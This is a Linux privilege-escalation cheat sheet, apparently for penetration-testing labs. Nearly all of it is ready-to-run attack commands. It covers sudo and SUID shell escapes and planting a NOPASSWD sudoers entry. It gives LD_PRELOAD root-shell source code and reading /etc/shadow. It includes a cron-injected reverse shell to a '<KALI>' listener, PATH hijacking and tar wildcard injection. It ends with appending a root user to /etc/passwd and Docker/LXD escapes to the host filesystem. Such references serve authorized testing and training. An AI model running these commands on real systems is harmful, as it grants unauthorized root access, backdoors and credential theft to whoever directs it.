Sudo Abuse

check sudo rights
sudo -l
sudo -ll   # verbose, shows env vars
GTFOBins — common sudo escapes
# Full sudo:
sudo /bin/bash
sudo su -

# vim:
sudo vim -c ':!/bin/bash'

# find:
sudo find / -name . -exec /bin/bash \; -quit
sudo find /tmp -exec bash -ip \;

# python/python3:
sudo python3 -c 'import os; os.execl("/bin/bash","bash","-p")'

# perl:
sudo perl -e 'exec "/bin/bash";'

# awk:
sudo awk 'BEGIN {system("/bin/bash -p")}'

# less / man / more:
sudo less /etc/passwd   # then: !bash
sudo man man            # then: !bash

# tar:
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# zip:
sudo zip /tmp/z.zip /tmp/z -T --unzip-command="sh -c /bin/bash"

# tee (write to sudoers):
echo 'hacker ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/hacker
LD_PRELOAD abuse (if env_keep+=LD_PRELOAD in sudo -l)
cat > /tmp/preload.c << 'CEOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash -p");
}
CEOF
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <any_allowed_binary>

SUID / SGID

find all SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null   # same
find / -perm -2000 -type f 2>/dev/null   # SGID
find / -perm /6000 -type f 2>/dev/null   # both
common SUID exploits — GTFOBins
# bash (if SUID):
/bin/bash -p

# find:
find /tmp -exec bash -p \;
find . -name . -exec bash -p \; -quit

# vim:
/usr/bin/vim -c ':!/bin/bash -p'

# python3:
/usr/bin/python3 -c 'import os; os.execl("/bin/bash","bash","-p")'

# env:
/usr/bin/env /bin/bash -p

# cp (overwrite passwd):
cp /bin/bash /tmp/r; chmod 4777 /tmp/r; /tmp/r -p

# base64 (read shadow):
LFILE=/etc/shadow; /usr/bin/base64 "$LFILE" | base64 -d

Cron Jobs

enumerate all cron locations
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null
systemctl list-timers --all   # systemd timers also run as root
/tmp/pspy64 -pf -i 1000       # watch every 1s with file operations
writable cron script — inject reverse shell
# If /etc/crontab has: * * * * * root /opt/scripts/backup.sh
# And you can write to /opt/scripts/backup.sh:
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'bash -i >& /dev/tcp/<KALI>/4444 0>&1' >> /opt/scripts/backup.sh
chmod +x /opt/scripts/backup.sh
# Wait for next minute, catch on: rlwrap nc -lvnp 4444
cron PATH hijack — relative commands
# If /etc/crontab PATH has a writable dir before /usr/bin
# and cron runs: * * * * * root cleanup (no full path)
echo '#!/bin/bash' > /home/user/cleanup
echo 'chmod +s /bin/bash' >> /home/user/cleanup
chmod +x /home/user/cleanup
# Wait for cron, then: bash -p
wildcard injection (tar in cron)
# If cron runs: tar czf /backup/files.tar.gz /var/www/html/*
# And you can write to /var/www/html/:
touch '/var/www/html/--checkpoint=1'
touch '/var/www/html/--checkpoint-action=exec=sh shell.sh'
echo '#!/bin/bash' > /var/www/html/shell.sh
echo 'chmod +s /bin/bash' >> /var/www/html/shell.sh
chmod +x /var/www/html/shell.sh
# When cron fires → bash -p

Capabilities

find + exploit
getcap -r / 2>/dev/null
# Dangerous caps:
# /usr/bin/python3 = cap_setuid+ep → setuid(0) then exec bash
# /usr/bin/perl = cap_setuid+ep    → same pattern
# /usr/bin/vim = cap_setuid+ep     → vim then :shell

# cap_setuid (python, perl, ruby):
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

Writable /etc/passwd

add root user if writable
# Check:
ls -la /etc/passwd
# Generate hash:
openssl passwd -1 -salt hacker hacker123
# Add root-level user:
echo 'hacker:$1$hacker$HASHHERE:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   # password: hacker123

Docker / LXD Group

Docker group → root
id   # look for "docker" in groups
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# now in container with full host FS as root
LXD group → root
id   # look for "lxd" in groups
lxc image import ./alpine.tar.gz --alias alpine
lxc init alpine ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite -- /bin/sh
# inside: cat /mnt/root/etc/shadow → add root user, or read proof.txt
